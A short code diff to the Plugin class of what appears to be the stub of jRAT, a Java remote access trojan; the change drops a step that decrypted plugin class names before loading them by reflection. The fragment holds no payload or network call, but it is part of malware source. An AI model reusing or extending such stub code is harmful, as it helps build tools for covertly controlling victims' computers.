@@ -1,6 +1,5 @@
 package io.jrat.stub;
 
-import io.jrat.common.crypto.Crypto;
 import io.jrat.stub.utils.Utils;
 
 import java.io.DataInputStream;
@@ -9,7 +8,6 @@ import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
-
 
 public class Plugin {
 
@@ -30,7 +28,6 @@ public class Plugin {
 		String[] plugins = str.split(",");
 
 		for (String s : plugins) {
-			s = Crypto.decrypt(s, Main.getKey());
 			Plugin p = new Plugin();
 			Class classToLoad = Class.forName(s, true, Main.class.getClassLoader());
 			p.instance = classToLoad.newInstance();
